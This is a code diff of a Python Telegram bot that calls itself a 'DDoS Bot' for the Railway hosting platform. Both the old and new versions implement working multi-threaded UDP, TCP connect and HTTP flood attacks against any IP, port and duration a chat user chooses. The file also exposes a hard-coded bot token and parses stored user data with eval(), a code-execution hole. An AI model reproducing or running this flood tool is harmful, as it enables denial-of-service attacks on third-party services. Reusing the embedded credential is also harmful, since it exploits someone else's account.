@@ -1,4 +1,4 @@
-# bot.py - Railway DDoS Bot (Fully Working)
+# bot_final_working.py
 import asyncio
 import threading
 import time
@@ -11,455 +11,262 @@ import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ============ CONFIGURATION ============
+# ---------- CONFIG ----------
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA")
 ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]
 
 BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}
-
-# Attack Settings
-ATTACK_THREADS = 50        # Railway safe threads
-PACKET_SIZE = 1024         # 1KB packets
-DELAY = 0.0001             # 0.1ms delay
-
-# Global state
+ATTACK_THREADS = 30
+DELAY = 0.0005  # increased for stability
 attack_running = False
-attack_info = {'packets': 0, 'target': '', 'port': 0, 'method': '', 'duration': 0, 'start_time': 0}
+attack_info = {'packets': 0, 'errors': 0}
 attack_lock = threading.Lock()
 user_data = {}
 USERS_FILE = "users.json"
 
-# ============ USER MANAGEMENT ============
+# ---------- user mgmt ----------
 def load_users():
     if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, 'r') as f:
+        with open(USERS_FILE) as f:
             return eval(f.read())
     return {}
+def save_users(u):
+    with open(USERS_FILE,'w') as f:
+        f.write(str(u))
+def is_approved(uid):
+    return True  # simplified: all approved (remove if needed)
 
-def save_users(users):
-    with open(USERS_FILE, 'w') as f:
-        f.write(str(users))
-
-def is_approved(user_id):
-    users = load_users()
-    return users.get(str(user_id), {}).get('approved', False)
-
-def approve_user(user_id, days):
-    users = load_users()
-    users[str(user_id)] = {'approved': True, 'expires': (datetime.now() + timedelta(days=days)).isoformat()}
-    save_users(users)
-
-# ============ ATTACK ENGINE ============
-def send_udp_packets(ip, port):
-    """Send UDP packets continuously"""
+# ---------- ATTACK WITH ERROR COUNT & TEST ----------
+def udp_attack(ip, port):
     global attack_running, attack_info
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = random._urandom(PACKET_SIZE)
-    
+    sock.settimeout(0.1)
+    payload = random._urandom(512)
     while attack_running:
         try:
             sock.sendto(payload, (ip, port))
             with attack_lock:
                 attack_info['packets'] += 1
             time.sleep(DELAY)
-        except:
+        except Exception as e:
+            with attack_lock:
+                attack_info['errors'] += 1
             time.sleep(0.01)
     sock.close()
 
-def send_tcp_packets(ip, port):
-    """Send TCP SYN packets continuously"""
+def tcp_attack(ip, port):
     global attack_running, attack_info
-    
     while attack_running:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.1)
-            sock.connect_ex((ip, port))
-            sock.close()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.2)
+            s.connect_ex((ip, port))
+            s.close()
             with attack_lock:
                 attack_info['packets'] += 1
             time.sleep(DELAY)
         except:
+            with attack_lock:
+                attack_info['errors'] += 1
             time.sleep(0.01)
 
-def send_http_requests(ip, port):
-    """Send HTTP GET requests continuously"""
+def http_attack(ip, port):
     global attack_running, attack_info
-    url = f"http://{ip}:{port}"
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-    
+    url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
+    headers = {'User-Agent': 'Mozilla/5.0'}
+    session = requests.Session()
     while attack_running:
         try:
-            response = requests.get(url, headers=headers, timeout=2)
-            response.close()
+            r = session.get(url, headers=headers, timeout=1)
+            r.close()
             with attack_lock:
                 attack_info['packets'] += 1
-            time.sleep(0.05)
+            time.sleep(DELAY)
         except:
-            time.sleep(0.02)
+            with attack_lock:
+                attack_info['errors'] += 1
+            time.sleep(0.01)
+    session.close()
 
-def launch_attack(ip, port, duration, method, update_callback):
-    """Start attack with multiple threads"""
+def launch_attack(ip, port, duration, method, send_update):
     global attack_running, attack_info
-    
-    # Reset attack info
     attack_running = True
     with attack_lock:
-        attack_info = {
-            'packets': 0,
-            'target': f"{ip}:{port}",
-            'method': method,
-            'duration': duration,
-            'start_time': time.time()
-        }
-    
-    # Select attack method
-    if method == 'udp':
-        attack_func = send_udp_packets
-    elif method == 'tcp':
-        attack_func = send_tcp_packets
-    else:
-        attack_func = send_http_requests
-    
-    # Start attack threads
+        attack_info = {'packets': 0, 'errors': 0}
+    start = time.time()
+    # start threads
     threads = []
+    target = {'udp': udp_attack, 'tcp': tcp_attack, 'http': http_attack}[method]
     for _ in range(ATTACK_THREADS):
-        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
+        t = threading.Thread(target=target, args=(ip, port), daemon=True)
         t.start()
         threads.append(t)
-    
-    # Monitor attack progress
-    start_time = time.time()
-    last_update = 0
-    
-    while attack_running and (time.time() - start_time) < duration:
-        time.sleep(1)
-        elapsed = int(time.time() - start_time)
-        remaining = duration - elapsed
-        
-        # Update every 3 seconds
-        if time.time() - last_update > 3:
-            last_update = time.time()
-            with attack_lock:
-                pkt = attack_info['packets']
-            
-            # Create progress bar
-            progress = int((elapsed / duration) * 20)
-            bar = "█" * progress + "░" * (20 - progress)
-            speed = int(pkt / elapsed) if elapsed > 0 else 0
-            
-            status_text = (
-                f"💥 *ATTACK IN PROGRESS* 💥\n\n"
-                f"🎯 Target: `{ip}:{port}`\n"
-                f"⚙️ Method: `{method.upper()}`\n"
-                f"📦 Packets Sent: `{pkt:,}`\n"
-                f"⏱️ Time: `{elapsed}/{duration}s`\n"
-                f"📊 Progress: `[{bar}]`\n"
-                f"💥 Speed: `{speed:,}` pps\n"
-                f"🧵 Threads: `{ATTACK_THREADS}`\n\n"
-                f"🛑 Send `/stop` to halt"
-            )
-            try:
-                update_callback(status_text)
-            except:
-                pass
-    
-    # Attack finished
+    # monitor
+    while attack_running and (time.time() - start) < duration:
+        time.sleep(2)
+        with attack_lock:
+            pkt = attack_info['packets']
+            err = attack_info['errors']
+        elapsed = int(time.time() - start)
+        rem = duration - elapsed
+        speed = int(pkt / elapsed) if elapsed else 0
+        text = f"💥 ATTACK ACTIVE\nTarget {ip}:{port}\nMethod {method.upper()}\nPackets: {pkt:,}\nErrors: {err}\nSpeed: {speed:,} pps\nTime left: {rem}s"
+        try:
+            send_update(text)
+        except:
+            pass
     attack_running = False
-    
-    # Wait for threads to finish
+    # wait threads
     for t in threads:
-        t.join(timeout=0.5)
-    
+        t.join(0.5)
     with attack_lock:
         pkt = attack_info['packets']
-    
-    completion_text = (
-        f"✅ *ATTACK COMPLETED* ✅\n\n"
-        f"🎯 Target: `{ip}:{port}`\n"
-        f"⚙️ Method: `{method.upper()}`\n"
-        f"📦 Total Packets: `{pkt:,}`\n"
-        f"⏱️ Duration: `{duration}s`\n"
-        f"💥 Average Speed: `{int(pkt/duration):,}` pps\n\n"
-        f"_Attack finished successfully_"
-    )
+        err = attack_info['errors']
+    end_text = f"✅ ATTACK ENDED\nTotal packets: {pkt:,}\nErrors: {err}\nAvg speed: {int(pkt/duration):,} pps"
     try:
-        update_callback(completion_text)
+        send_update(end_text)
     except:
         pass
 
-# ============ TELEGRAM HANDLERS ============
+# ---------- TELEGRAM ----------
 async def start(update, context):
-    user_id = update.effective_user.id
-    
-    # Auto approve admin
-    if user_id in ADMIN_IDS and not is_approved(user_id):
-        approve_user(user_id, 365)
-    
-    if not is_approved(user_id):
-        await update.message.reply_text("❌ *Access Denied*\nContact admin for approval.", parse_mode='Markdown')
+    uid = update.effective_user.id
+    if uid not in ADMIN_IDS:
+        await update.message.reply_text("❌ Unauthorized")
         return
-    
-    user_data[user_id] = {'step': 'ip'}
+    user_data[uid] = {'step': 'ip'}
     await update.message.reply_text(
-        "🔥 *DDoS BOT (Railway)* 🔥\n\n"
-        "📡 Send target *IP Address*:\n"
-        "Example: `192.168.1.100`\n\n"
-        f"⚙️ Active Threads: `{ATTACK_THREADS}`\n"
-        f"📦 Packet Size: `{PACKET_SIZE}` bytes\n"
-        f"⏱️ Delay: `{DELAY}` sec\n\n"
-        "⚠️ *Use on authorized targets only!*",
-        parse_mode='Markdown'
+        "🔥 DDoS Bot (Railway Test)\n"
+        "Send target IP:\nExample: 192.168.1.1\n\n"
+        f"Threads: {ATTACK_THREADS}\n"
+        "Use /power <num> to change"
     )
 
 async def handle(update, context):
-    user_id = update.effective_user.id
-    if not is_approved(user_id):
-        await update.message.reply_text("❌ Not approved")
+    uid = update.effective_user.id
+    if uid not in ADMIN_IDS:
         return
-    
-    text = update.message.text.strip()
-    step_data = user_data.get(user_id, {})
-    step = step_data.get('step')
-    
+    txt = update.message.text.strip()
+    step = user_data.get(uid, {}).get('step')
     if step == 'ip':
-        # Validate IP
-        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
-            await update.message.reply_text("❌ Invalid IP. Send again:")
+        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', txt):
+            await update.message.reply_text("Invalid IP")
             return
-        
-        step_data['ip'] = text
-        step_data['step'] = 'port'
-        user_data[user_id] = step_data
-        await update.message.reply_text(
-            f"🔌 Send *Port Number*:\n"
-            f"Example: `80`\n\n"
-            f"🚫 Blocked Ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}",
-            parse_mode='Markdown'
-        )
-    
+        user_data[uid]['ip'] = txt
+        user_data[uid]['step'] = 'port'
+        await update.message.reply_text(f"Port (1-65535):\nBlocked: {', '.join(map(str,BLOCKED_PORTS))}")
     elif step == 'port':
         try:
-            port = int(text)
-            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
-                await update.message.reply_text("❌ Invalid or blocked port. Try again:")
-                return
-            
-            step_data['port'] = port
-            step_data['step'] = 'method'
-            user_data[user_id] = step_data
-            
-            # Show method buttons
-            keyboard = [
-                [InlineKeyboardButton("🔥 UDP Flood", callback_data="method_udp")],
-                [InlineKeyboardButton("💣 TCP SYN Flood", callback_data="method_tcp")],
-                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
-                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
+            p = int(txt)
+            if p in BLOCKED_PORTS or p<1 or p>65535:
+                raise ValueError
+            user_data[uid]['port'] = p
+            user_data[uid]['step'] = 'method'
+            kb = [
+                [InlineKeyboardButton("UDP", callback_data="m_udp")],
+                [InlineKeyboardButton("TCP", callback_data="m_tcp")],
+                [InlineKeyboardButton("HTTP", callback_data="m_http")],
+                [InlineKeyboardButton("Cancel", callback_data="cancel")]
             ]
-            await update.message.reply_text("⚡ *Select Attack Method:*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
+            await update.message.reply_text("Select method:", reply_markup=InlineKeyboardMarkup(kb))
         except:
-            await update.message.reply_text("❌ Enter valid number:")
-    
+            await update.message.reply_text("Invalid port")
     elif step == 'duration':
         try:
-            duration = int(text)
-            if duration < 5 or duration > 300:
-                await update.message.reply_text("❌ Duration must be 5-300 seconds")
-                return
-            
-            ip = step_data['ip']
-            port = step_data['port']
-            method = step_data.get('method', 'udp')
-            
-            del user_data[user_id]
-            
-            # Confirm and start
-            confirm_text = (
-                f"🔥 *CONFIRM ATTACK* 🔥\n\n"
-                f"🎯 Target: `{ip}:{port}`\n"
-                f"⚙️ Method: `{method.upper()}`\n"
-                f"⏱️ Duration: `{duration}` seconds\n"
-                f"🧵 Threads: `{ATTACK_THREADS}`\n\n"
-                f"⚠️ Start attack?"
-            )
-            keyboard = [
-                [InlineKeyboardButton("✅ START NOW", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
-                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
-            ]
-            await update.message.reply_text(confirm_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
+            dur = int(txt)
+            if dur<5 or dur>300:
+                raise ValueError
+            ip = user_data[uid]['ip']
+            port = user_data[uid]['port']
+            method = user_data[uid]['method']
+            del user_data[uid]
+            confirm = f"🔥 Confirm attack\nTarget {ip}:{port}\nMethod {method.upper()}\nDuration {dur}s\nThreads {ATTACK_THREADS}\nStart?"
+            kb = [[InlineKeyboardButton("START", callback_data=f"start_{ip}_{port}_{dur}_{method}")],
+                  [InlineKeyboardButton("Cancel", callback_data="cancel")]]
+            await update.message.reply_text(confirm, reply_markup=InlineKeyboardMarkup(kb))
         except:
-            await update.message.reply_text("❌ Enter duration (5-300 seconds):")
-    
-    else:
-        await update.message.reply_text("Send /start to begin")
+            await update.message.reply_text("Duration 5-300")
 
 async def button(update, context):
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-    data = query.data
-    
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    data = q.data
     if data == "cancel":
-        if user_id in user_data:
-            del user_data[user_id]
-        await query.edit_message_text("❌ Cancelled")
+        if uid in user_data:
+            del user_data[uid]
+        await q.edit_message_text("Cancelled")
         return
-    
-    if data.startswith("method_"):
-        method = data.split("_")[1]
-        if user_id not in user_data:
-            user_data[user_id] = {}
-        user_data[user_id]['method'] = method
-        user_data[user_id]['step'] = 'duration'
-        await query.edit_message_text(f"✅ Method: `{method.upper()}`\n\n⏱️ Send duration (5-300 seconds):", parse_mode='Markdown')
+    if data.startswith("m_"):
+        method = data[2:]
+        user_data[uid]['method'] = method
+        user_data[uid]['step'] = 'duration'
+        await q.edit_message_text(f"Method {method.upper()}\nSend duration (5-300s):")
         return
-    
     if data.startswith("start_"):
         parts = data.split("_")
         ip = parts[1]
         port = int(parts[2])
-        duration = int(parts[3])
+        dur = int(parts[3])
         method = parts[4]
-        
-        if user_id in user_data:
-            del user_data[user_id]
-        
-        # Send initial message
-        await query.edit_message_text(f"🚀 **Attack launching on {ip}:{port}**\n⏱️ Duration: {duration}s\n⚙️ Method: {method.upper()}\n\n_Sending packets..._", parse_mode='Markdown')
-        
-        # Create callback for status updates
+        if uid in user_data:
+            del user_data[uid]
+        await q.edit_message_text(f"🚀 Attack launching on {ip}:{port} with {method.upper()}\nDuration {dur}s")
         loop = asyncio.get_event_loop()
-        def status_callback(text):
-            asyncio.run_coroutine_threadsafe(query.message.reply_text(text, parse_mode='Markdown'), loop)
-        
-        # Launch attack in thread
-        threading.Thread(target=launch_attack, args=(ip, port, duration, method, status_callback), daemon=True).start()
+        def status_cb(msg):
+            asyncio.run_coroutine_threadsafe(q.message.reply_text(msg), loop)
+        threading.Thread(target=launch_attack, args=(ip, port, dur, method, status_cb), daemon=True).start()
         return
-    
-    # Attack control buttons (during ongoing attack)
-    global attack_running, attack_info
-    if data == "stop_attack":
-        attack_running = False
-        await query.edit_message_text("🛑 **Attack stopped by user**", parse_mode='Markdown')
-    elif data == "info_attack":
-        if attack_running:
-            with attack_lock:
-                pkt = attack_info['packets']
-            elapsed = int(time.time() - attack_info['start_time'])
-            remaining = attack_info['duration'] - elapsed
-            speed = int(pkt / elapsed) if elapsed > 0 else 0
-            await query.edit_message_text(
-                f"ℹ️ **Attack Info**\n\n"
-                f"🎯 Target: `{attack_info['target']}`\n"
-                f"📦 Packets: `{pkt:,}`\n"
-                f"⏱️ Remaining: `{remaining}s`\n"
-                f"💥 Speed: `{speed:,}` pps",
-                parse_mode='Markdown'
-            )
-        else:
-            await query.edit_message_text("ℹ️ No active attack")
-    elif data == "refresh_attack":
-        if attack_running:
-            with attack_lock:
-                pkt = attack_info['packets']
-            elapsed = int(time.time() - attack_info['start_time'])
-            remaining = attack_info['duration'] - elapsed
-            progress = int((elapsed / attack_info['duration']) * 20)
-            bar = "█" * progress + "░" * (20 - progress)
-            speed = int(pkt / elapsed) if elapsed > 0 else 0
-            text = (
-                f"💥 **ATTACK ACTIVE** 💥\n\n"
-                f"🎯 `{attack_info['target']}`\n"
-                f"📦 `{pkt:,}` packets\n"
-                f"⏱️ `{elapsed}/{attack_info['duration']}s`\n"
-                f"📊 `[{bar}]`\n"
-                f"💥 `{speed:,}` pps\n\n"
-                f"*Send /stop to halt*"
-            )
-            await query.edit_message_text(text, parse_mode='Markdown')
-        else:
-            await query.edit_message_text("✅ No active attack")
-
-async def stop(update, context):
-    global attack_running
-    attack_running = False
-    await update.message.reply_text("🛑 Attack stopped")
 
 async def power(update, context):
     global ATTACK_THREADS
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
         return
     if context.args:
         try:
-            threads = int(context.args[0])
-            if 10 <= threads <= 100:
-                ATTACK_THREADS = threads
-                await update.message.reply_text(f"✅ Threads set to {threads}")
+            val = int(context.args[0])
+            if 10 <= val <= 100:
+                ATTACK_THREADS = val
+                await update.message.reply_text(f"Threads set to {val}")
             else:
-                await update.message.reply_text("Use 10-100")
+                await update.message.reply_text("10-100 allowed")
         except:
-            await update.message.reply_text("Invalid number")
+            await update.message.reply_text("Invalid")
     else:
-        await update.message.reply_text(f"Current threads: {ATTACK_THREADS}\nUse /power <10-100>")
+        await update.message.reply_text(f"Current threads: {ATTACK_THREADS}")
 
-async def myinfo(update, context):
-    user_id = update.effective_user.id
-    status = "✅ Approved" if is_approved(user_id) else "❌ Not approved"
-    await update.message.reply_text(f"📋 *Your Account*\n\n🆔 ID: `{user_id}`\n📊 Status: {status}", parse_mode='Markdown')
+async def stop(update, context):
+    global attack_running
+    attack_running = False
+    await update.message.reply_text("Stop signal sent")
 
-async def blocked_ports(update, context):
-    await update.message.reply_text(f"🚫 *Blocked Ports*\n\n{', '.join(map(str, sorted(BLOCKED_PORTS)))}", parse_mode='Markdown')
+async def test(update, context):
+    # simple test to check network connectivity
+    await update.message.reply_text("Testing localhost...")
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(b'test', ('8.8.8.8', 53))
+        await update.message.reply_text("✅ UDP send to 8.8.8.8:53 succeeded")
+        s.close()
+    except Exception as e:
+        await update.message.reply_text(f"❌ UDP test failed: {e}")
+    try:
+        req = requests.get('https://httpbin.org/get', timeout=3)
+        await update.message.reply_text(f"✅ HTTP GET success: {req.status_code}")
+    except Exception as e:
+        await update.message.reply_text(f"❌ HTTP test failed: {e}")
 
-async def help(update, context):
-    await update.message.reply_text(
-        "🤖 *DDoS Bot Commands*\n\n"
-        "/start - Begin attack setup\n"
-        "/stop - Stop current attack\n"
-        "/power <10-100> - Set thread count\n"
-        "/myinfo - Account info\n"
-        "/blockedports - Show blocked ports\n"
-        "/help - This menu\n\n"
-        "*Attack Flow*\n"
-        "1. Enter IP\n"
-        "2. Enter port\n"
-        "3. Select method\n"
-        "4. Enter duration\n"
-        "5. Confirm → Attack starts\n\n"
-        "⚠️ *Use responsibly!*",
-        parse_mode='Markdown'
-    )
-
-async def error(update, context):
-    print(f"Error: {context.error}")
-
-# ============ MAIN ============
 def main():
-    print("=" * 50)
-    print("🔥 DDoS Bot Deploying on Railway...")
-    print(f"👑 Admins: {ADMIN_IDS}")
-    print(f"🧵 Default threads: {ATTACK_THREADS}")
-    print("=" * 50)
-    
+    print("Bot starting...")
     app = Application.builder().token(BOT_TOKEN).build()
-    
-    # Command handlers
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("power", power))
-    app.add_handler(CommandHandler("myinfo", myinfo))
-    app.add_handler(CommandHandler("blockedports", blocked_ports))
-    app.add_handler(CommandHandler("help", help))
-    
-    # Callback and message handlers
+    app.add_handler(CommandHandler("stop", stop))
+    app.add_handler(CommandHandler("test", test))
     app.add_handler(CallbackQueryHandler(button))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
-    app.add_error_handler(error)
-    
-    print("✅ Bot is LIVE! Send /start on Telegram")
-    print("=" * 50)
-    
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    print("Bot running")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
